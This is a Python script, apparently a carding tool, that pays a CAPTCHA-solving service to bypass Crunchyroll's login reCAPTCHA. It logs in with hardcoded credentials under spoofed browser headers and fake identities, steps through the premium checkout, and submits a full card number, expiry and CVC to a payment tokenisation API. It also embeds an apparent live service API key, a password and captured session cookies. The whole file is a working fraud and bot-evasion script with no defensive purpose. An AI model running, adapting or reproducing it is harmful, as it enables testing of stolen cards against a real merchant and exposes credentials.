import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid
import time
from fake_useragent import UserAgent
import logging
import asyncio
from twocaptcha import TwoCaptcha
from playwright.sync_api import sync_playwright




API_KEY = "2386a15d92d40951731525d290043436"

res = requests.post("http://2captcha.com/in.php", data={
    "key": API_KEY,
    "method": "userrecaptcha",
    "googlekey": "6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk",
    "pageurl": "https://sso.crunchyroll.com/es-es/login"
}).text

captcha_id = res.split("|")[1]

while True:
    time.sleep(3)

    res = requests.get(
        f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}"
    ).text

    if res == "CAPCHA_NOT_READY":
        continue
    else:
        token = res.split("|")[1]
        break

print("TOKEN:", token)

direc = real_random_address()


def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class americanairlessonline:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"



    Agent = UserAgent().random
    session = requests.Session()

    guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
    muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
    sid = str(uuid.uuid4()).replace('-', '') + '438b7a'

    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.crunchyroll.com/',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        # 'cookie': 'device_id=8e4494c8-276f-432f-88ea-e8be82be7551; c_locale=es-ES; OptanonAlertBoxClosed=2026-04-04T08:33:29.634Z; anonymous_consent_tos=1775291604249; ab.storage.userId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22cbc7cdae-3536-5c4a-bd2d-869dc090eea9%22%2C%22c%22%3A1775291943476%2C%22l%22%3A1775291943481%7D; ab.storage.deviceId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22afd1a5c9-9396-0349-a47c-66804b1e508b%22%2C%22c%22%3A1775291943485%2C%22l%22%3A1775291943485%7D; ab.storage.sessionId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%227b210942-8243-23e5-d5ad-f27a58b8e7f2%22%2C%22e%22%3A1775293743494%2C%22c%22%3A1775291943478%2C%22l%22%3A1775291943494%7D; NEXT_LOCALE=es-es; ajs_anonymous_id=783063b1-3c81-4bd4-8a66-b38a7c3f8f0e; __cf_bm=qv_hHIrzJ7mDy0yrqs5ASk1VN91WSKp2gvhvvBKh23U-1775330663-1.0.1.1-KwO.jz4VYJjWLsdKeZT7S6BMwdalKklBbG.0PBg2D17rQj9V2CuoZZ0JPOcZ3y2JYAUEbIL744zJFWxIQHrMMacK1am3YIrqq6iVjivMxwBRciheLh010EMx_Y2cZLnM; _evidon_suppress_notification_cookie=1; cf_clearance=qYyqvMw3_PbDI3jxqihmyqTvchWCqep4rEtWoXZ97D4-1775330668-1.2.1.1-1hiw5LZWfGWkXD9kNCzLJwd7HqU_SGcBKp7MrTgLTvhDeVl2MSOa4LfG9yZ9psrqolY2KIjYBP8iNo6NG1iay1GZQwV4Wl_cI.Mq7y8kT8PBez2el28gbK7.j0iJbnT8xseg9eUFKXiK0r_Cgl_fW0FepT.WQStMtoMkeX7IiIlCohvxLuuiWLaJmM4h5cMgSfQHMMA5U9NymQ539jVhGdxvoWb5cT0lnb5EJFe5V4TprSt0a8T3bvvwc_47ZxFaS4.3UILPrzpHD7p94mGdMTCeLWx1BiHlc.6IuDxYK1IwgBiLmWCRW8ZWFerXgCqynXKLp.bI.ovrNpmG.ZQZhg; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+04+2026+14%3A24%3A33+GMT-0500+(hora+de+Ecuador)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=&consentId=c23e7854-9bcf-4d9a-a719-09d0c78da0dd&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1&intType=1&crTime=1775291609967&geolocation=%3B&AwaitingReconsent=false',
    }

    response = session.get('https://sso.crunchyroll.com/es-es/login', headers=headers).text
    

    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.8',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://sso.crunchyroll.com',
        'priority': 'u=1, i',
        'referer': 'https://sso.crunchyroll.com/es-es/login',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        # 'cookie': 'device_id=8e4494c8-276f-432f-88ea-e8be82be7551; c_locale=es-ES; OptanonAlertBoxClosed=2026-04-04T08:33:29.634Z; anonymous_consent_tos=1775291604249; ab.storage.userId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22cbc7cdae-3536-5c4a-bd2d-869dc090eea9%22%2C%22c%22%3A1775291943476%2C%22l%22%3A1775291943481%7D; ab.storage.deviceId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22afd1a5c9-9396-0349-a47c-66804b1e508b%22%2C%22c%22%3A1775291943485%2C%22l%22%3A1775291943485%7D; ab.storage.sessionId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%227b210942-8243-23e5-d5ad-f27a58b8e7f2%22%2C%22e%22%3A1775293743494%2C%22c%22%3A1775291943478%2C%22l%22%3A1775291943494%7D; NEXT_LOCALE=es-es; ajs_anonymous_id=783063b1-3c81-4bd4-8a66-b38a7c3f8f0e; __cf_bm=qv_hHIrzJ7mDy0yrqs5ASk1VN91WSKp2gvhvvBKh23U-1775330663-1.0.1.1-KwO.jz4VYJjWLsdKeZT7S6BMwdalKklBbG.0PBg2D17rQj9V2CuoZZ0JPOcZ3y2JYAUEbIL744zJFWxIQHrMMacK1am3YIrqq6iVjivMxwBRciheLh010EMx_Y2cZLnM; _evidon_suppress_notification_cookie=1; cf_clearance=qYyqvMw3_PbDI3jxqihmyqTvchWCqep4rEtWoXZ97D4-1775330668-1.2.1.1-1hiw5LZWfGWkXD9kNCzLJwd7HqU_SGcBKp7MrTgLTvhDeVl2MSOa4LfG9yZ9psrqolY2KIjYBP8iNo6NG1iay1GZQwV4Wl_cI.Mq7y8kT8PBez2el28gbK7.j0iJbnT8xseg9eUFKXiK0r_Cgl_fW0FepT.WQStMtoMkeX7IiIlCohvxLuuiWLaJmM4h5cMgSfQHMMA5U9NymQ539jVhGdxvoWb5cT0lnb5EJFe5V4TprSt0a8T3bvvwc_47ZxFaS4.3UILPrzpHD7p94mGdMTCeLWx1BiHlc.6IuDxYK1IwgBiLmWCRW8ZWFerXgCqynXKLp.bI.ovrNpmG.ZQZhg; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+04+2026+14%3A24%3A58+GMT-0500+(hora+de+Ecuador)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=&consentId=c23e7854-9bcf-4d9a-a719-09d0c78da0dd&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1&intType=1&crTime=1775291609967&geolocation=%3B&AwaitingReconsent=false',
    }

    data = {
    "email":"sdefdcsfvrerr@gmail.com",
    "password":"leito132asd",
    "recaptchaToken":{token},"eventSettings":{}
    }
    response = session.post('https://sso.crunchyroll.com/api/login',  headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'if-modified-since': 'Fri, 03 Apr 2026 20:29:46 GMT',
        'if-none-match': 'W/"7918214bd6f13c566ed5ce7ee2bbeeeb"',
        'priority': 'u=0, i',
        'referer': 'https://sso.crunchyroll.com/',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version-list': '"Chromium";v="146.0.0.0", "Not-A.Brand";v="24.0.0.0", "Brave";v="146.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        # 'cookie': 'device_id=8e4494c8-276f-432f-88ea-e8be82be7551; c_locale=es-ES; OptanonAlertBoxClosed=2026-04-04T08:33:19.274Z; anonymous_consent_tos=1775291604249; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+04+2026+03%3A39%3A00+GMT-0500+(hora+de+Ecuador)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=V1%3A0%2CV17%3A0%2CV11%3A0%2CV3%3A0%2CV7%3A0%2CV2%3A0%2C&consentId=f5311711-e2a9-4f24-89b4-d5438b6c7535&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&crTime=1775291600060&geolocation=%3B&AwaitingReconsent=false; anonymous_consent_tos=1775291604249; ab.storage.userId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22cbc7cdae-3536-5c4a-bd2d-869dc090eea9%22%2C%22c%22%3A1775291943476%2C%22l%22%3A1775291943481%7D; ab.storage.deviceId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22afd1a5c9-9396-0349-a47c-66804b1e508b%22%2C%22c%22%3A1775291943485%2C%22l%22%3A1775291943485%7D; ab.storage.sessionId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%227b210942-8243-23e5-d5ad-f27a58b8e7f2%22%2C%22e%22%3A1775293743494%2C%22c%22%3A1775291943478%2C%22l%22%3A1775291943494%7D; _dd_s=aid=f6094eb7-c497-4634-b24a-a3f9ff125c15&rum=0&expire=1775293019620; ajs_anonymous_id=783063b1-3c81-4bd4-8a66-b38a7c3f8f0e; __cf_bm=qv_hHIrzJ7mDy0yrqs5ASk1VN91WSKp2gvhvvBKh23U-1775330663-1.0.1.1-KwO.jz4VYJjWLsdKeZT7S6BMwdalKklBbG.0PBg2D17rQj9V2CuoZZ0JPOcZ3y2JYAUEbIL744zJFWxIQHrMMacK1am3YIrqq6iVjivMxwBRciheLh010EMx_Y2cZLnM; cf_clearance=qYyqvMw3_PbDI3jxqihmyqTvchWCqep4rEtWoXZ97D4-1775330668-1.2.1.1-1hiw5LZWfGWkXD9kNCzLJwd7HqU_SGcBKp7MrTgLTvhDeVl2MSOa4LfG9yZ9psrqolY2KIjYBP8iNo6NG1iay1GZQwV4Wl_cI.Mq7y8kT8PBez2el28gbK7.j0iJbnT8xseg9eUFKXiK0r_Cgl_fW0FepT.WQStMtoMkeX7IiIlCohvxLuuiWLaJmM4h5cMgSfQHMMA5U9NymQ539jVhGdxvoWb5cT0lnb5EJFe5V4TprSt0a8T3bvvwc_47ZxFaS4.3UILPrzpHD7p94mGdMTCeLWx1BiHlc.6IuDxYK1IwgBiLmWCRW8ZWFerXgCqynXKLp.bI.ovrNpmG.ZQZhg; etp_rt=e8050bfe-84d9-48f8-a699-dd8f088ca0ca',
    }

    response = session.get('https://www.crunchyroll.com/es-es/discover', headers=headers)
    

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://www.crunchyroll.com/es-es/discover',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version-list': '"Chromium";v="146.0.0.0", "Not-A.Brand";v="24.0.0.0", "Brave";v="146.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        # 'cookie': 'device_id=8e4494c8-276f-432f-88ea-e8be82be7551; c_locale=es-ES; OptanonAlertBoxClosed=2026-04-04T08:33:19.274Z; anonymous_consent_tos=1775291604249; anonymous_consent_tos=1775291604249; ajs_anonymous_id=783063b1-3c81-4bd4-8a66-b38a7c3f8f0e; etp_rt=e8050bfe-84d9-48f8-a699-dd8f088ca0ca; _evidon_suppress_notification_cookie=1; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+04+2026+14%3A38%3A37+GMT-0500+(hora+de+Ecuador)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=V1%3A0%2CV17%3A0%2CV11%3A0%2CV3%3A0%2CV7%3A0%2CV2%3A0%2C&consentId=f5311711-e2a9-4f24-89b4-d5438b6c7535&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&crTime=1775291600060&geolocation=%3B&AwaitingReconsent=false; cf_clearance=F_hNVsoF9UbzjOF9z07mInms50Z96wD2ckf_ZOe7B8s-1775331518-1.2.1.1-D3CpaAmf4q8QrTvErU5WZ9TVhSAWgj3STrvWOPnCcEY705D34GgNXmPCELyHpv7Kjmw1aI4zV_jzTwHF6siqihdM6f.5bl942Jv2ZvEbHIrdplDXoH3Kojmx.2NMQGjHYglCj1.L1tDJNC2VMlSZ1eEvw7_NUgy8KEYRdqMjyMA3TSepODeNlsrCqazJuCE8YKb_Vd9LCaizkAqCUHNCU6ljwtQ9Zl8uclI7bw18a2iYlLVH6_gjyzaGDBzoOXs3vGzaWmv.GXHivFp1op4Yj6dd1XbtZLriczNzL61V1RpSSY3DNqs.hk4DDQjbzMJ8r_2KL6ynQwNuPUFPTZUAaA; cr_exp=cbc7cdae-3536-5c4a-bd2d-869dc090eea9cbc7cdae-3536-5c4a-bd2d-869dc090eea9; ab.storage.userId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22cbc7cdae-3536-5c4a-bd2d-869dc090eea9%22%2C%22c%22%3A1775331524568%2C%22l%22%3A1775331524575%7D; ab.storage.deviceId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%227e010e45-39b7-82b2-3349-c5104330e45b%22%2C%22c%22%3A1775331524578%2C%22l%22%3A1775331524578%7D; ab.storage.sessionId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22dead0af6-b230-404a-8421-c25de7110626%22%2C%22e%22%3A1775333324587%2C%22c%22%3A1775331524571%2C%22l%22%3A1775331524587%7D; _dd_s=aid=f6094eb7-c497-4634-b24a-a3f9ff125c15&rum=0&expire=1775333910664; __cf_bm=4ZZ.bcP1gsfsbZaZxlXlRsf2pgLCTowHWLkTCg9tqFI-1775333010-1.0.1.1-0wpUMh07oY0qHE7g6zyk.StXzRi3ZpzMLnadFWw1q_AaRWLcBd8lM14U32hDMNHODmEGs7UCSQzgnciZpk.a8HFE1cS2ne2LYVm1HNpvYcB7JkLNtWleB2Jq3Xs4wvRK',
    }

    params = {
        'referrer': 'newweb_organic_header',
        'return_url': 'https://www.crunchyroll.com/es-es/discover',
    }

    response = session.get('https://www.crunchyroll.com/es-es/premium', params=params,  headers=headers)
        
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://www.crunchyroll.com/es-es/premium?referrer=newweb_organic_header&return_url=https%3A%2F%2Fwww.crunchyroll.com%2Fes-es%2Fdiscover',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version-list': '"Chromium";v="146.0.0.0", "Not-A.Brand";v="24.0.0.0", "Google Chrome";v="146.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        # 'cookie': 'device_id=8e4494c8-276f-432f-88ea-e8be82be7551; c_locale=es-ES; OptanonAlertBoxClosed=2026-04-04T08:33:19.274Z; anonymous_consent_tos=1775291604249; anonymous_consent_tos=1775291604249; ajs_anonymous_id=783063b1-3c81-4bd4-8a66-b38a7c3f8f0e; etp_rt=e8050bfe-84d9-48f8-a699-dd8f088ca0ca; _evidon_suppress_notification_cookie=1; cr_exp=cbc7cdae-3536-5c4a-bd2d-869dc090eea9cbc7cdae-3536-5c4a-bd2d-869dc090eea9; ab.storage.userId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22cbc7cdae-3536-5c4a-bd2d-869dc090eea9%22%2C%22c%22%3A1775331524568%2C%22l%22%3A1775331524575%7D; ab.storage.deviceId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%227e010e45-39b7-82b2-3349-c5104330e45b%22%2C%22c%22%3A1775331524578%2C%22l%22%3A1775331524578%7D; ab.storage.sessionId.80f403d2-1c18-471d-b0ef-243d1d646436=%7B%22g%22%3A%22dead0af6-b230-404a-8421-c25de7110626%22%2C%22e%22%3A1775333324587%2C%22c%22%3A1775331524571%2C%22l%22%3A1775331524587%7D; _dd_s=aid=f6094eb7-c497-4634-b24a-a3f9ff125c15&rum=0&expire=1775333910664; __cf_bm=4ZZ.bcP1gsfsbZaZxlXlRsf2pgLCTowHWLkTCg9tqFI-1775333010-1.0.1.1-0wpUMh07oY0qHE7g6zyk.StXzRi3ZpzMLnadFWw1q_AaRWLcBd8lM14U32hDMNHODmEGs7UCSQzgnciZpk.a8HFE1cS2ne2LYVm1HNpvYcB7JkLNtWleB2Jq3Xs4wvRK; cf_clearance=JiNCUXR3BoTMSZ1CzYFwWyTMnsme1MJ.rxkbCsm7u90-1775333013-1.2.1.1-y5XnoTgA4GTdBLxvWfrzgd4KI5ccIB7NrkjaVlzF96yjC4IuUX2KLgY8jObdPEH67aAXiZ3zRZp_7a5JgXODP5fR7vSAtIBc0ncZk6b216F6AgdnX5ejszzQm12NeQ2802JoHKwlvFrPyUohZOUDvZT8zFCdq2ItlzQY020iF2qe2aUjNDjHYKK4vr5q.YfyHlurjTordbZXkRXaMqx54Wms_GbNpRq4xmW78A_NnwDf.u2shkgkPkYK.vHl7hQOFGfsNBZABFHlMfNfQLFRONVJWLDeMBYNLlRbdJXHuMoCp6v2ThZZfOqOiK1rf6YkJozqZqzMoe8k_gcKflT6hA; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Apr+04+2026+15%3A03%3A35+GMT-0500+(hora+de+Ecuador)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=V1%3A0%2CV17%3A0%2CV11%3A0%2CV3%3A0%2CV7%3A0%2CV2%3A0%2C&consentId=f5311711-e2a9-4f24-89b4-d5438b6c7535&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&intType=1&crTime=1775291600060&geolocation=%3B&AwaitingReconsent=false',
    }

    params = {
        'client_type': 'com.crunchyroll.static',
        'failure_url': 'https://www.crunchyroll.com/es-es/premium/error?is_free_trial_flow%3D1%26return_url%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fes-es%252Fdiscover%26selected_sku%3Dcr_premium.1_month',
        'ref': 'newweb_organic_header',
        'return_url': 'https://www.crunchyroll.com/es-es/premium/success?is_free_trial_flow%3D1%26return_url%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fes-es%252Fdiscover%26selected_sku%3Dcr_premium.1_month',
        'sku': 'cr_premium.1_month',
    }

    response = session.get('https://www.crunchyroll.com/es-es/payments/checkout', params=params,  headers=headers)
    
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.8',
        'bt-api-key': 'key_prod_us_pub_LdbAJrE9KQaJ5Vfz9bYLKU',
        'bt-device-info': 'eyJ1YUJyYW5kcyI6W3siYnJhbmQiOiJDaHJvbWl1bSIsInZlcnNpb24iOiIxNDYifSx7ImJyYW5kIjoiTm90LUEuQnJhbmQiLCJ2ZXJzaW9uIjoiMjQifSx7ImJyYW5kIjoiR29vZ2xlIENocm9tZSIsInZlcnNpb24iOiIxNDYifV0sInVhTW9iaWxlIjpmYWxzZSwidWFQbGF0Zm9ybSI6IldpbmRvd3MiLCJsYW5ndWFnZXMiOlsiZXMtRVMiXSwidGltZVpvbmUiOiJBbWVyaWNhL0d1YXlhcXVpbCIsImNvb2tpZXNFbmFibGVkIjp0cnVlLCJsb2NhbFN0b3JhZ2VFbmFibGVkIjp0cnVlLCJzZXNzaW9uU3RvcmFnZUVuYWJsZWQiOnRydWUsInBsYXRmb3JtIjoiV2luMzIiLCJoYXJkd2FyZUNvbmN1cnJlbmN5Ijo0LCJkZXZpY2VNZW1vcnlHYiI6NCwic2NyZWVuV2lkdGgiOjE2ODAsInNjcmVlbkhlaWdodCI6MTA1MCwic2NyZWVuQXZhaWxXaWR0aCI6MTY4MCwic2NyZWVuQXZhaWxIZWlnaHQiOjEwNTAsImlubmVyV2lkdGgiOjg0NywiaW5uZXJIZWlnaHQiOjk2NiwiZGV2aWNlUGl4ZWxSYXRpbyI6MSwibWF4VG91Y2hQb2ludHMiOjAsInBsdWdpbnMiOlsiTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlciIsIldlYktpdCBidWlsdC1pbiBQREYiLCJtZjJqNDdsUyIsIkNocm9taXVtIFBERiBWaWV3ZXIiLCJ2MjY4ZXUyIiwiUERGIFZpZXdlciIsIkNocm9taXVtIFBERiBhbmQgUFMgVmlld2VyIl0sIm1pbWVUeXBlcyI6WyJhcHBsaWNhdGlvbi9wZGYiLCJ0ZXh0L3BkZiJdLCJ3ZWJkcml2ZXIiOmZhbHNlLCJzdXNwZWN0ZWRIZWFkbGVzcyI6ZmFsc2UsIndlYmdsVmVuZG9yIjoiR29vZ2xlIEluYy4gKEFNRCkiLCJ3ZWJnbFJlbmRlcmVyIjoiQU5HTEUgKEFNRCwgQU1EIFJhZGVvbihUTSkgVmVnYSA4IEdyYXBoaWNzICgweDAwMDAxNUQ4KSBEaXJlY3QzRDExIHZzXzVfMCBwc181XzAsIEQzRDExKSJ9',
        'content-type': 'application/json',
        'origin': 'https://js.basistheory.com',
        'priority': 'u=1, i',
        'referer': 'https://js.basistheory.com/web-elements/2.3.0/hosted-elements/data-element.html?element_id=d4bff3b7-75c3-4cad-813f-ee041796e716',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'none',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    }

    json_data = {
        'type': 'card',
        'fingerprint_expression': '{{data.number}}',
        'data': {
            'number': '4610460334551959',
            'expiration_month': 12,
            'expiration_year': 2028,
            'cvc': '269',
        },
    }

    response = session.post('https://js.basistheory.com/api/tokens', headers=headers, json=json_data).json()
    id = response['id']
    tenant_id = response['tenant_id']
    print(id)
    print(tenant_id)
 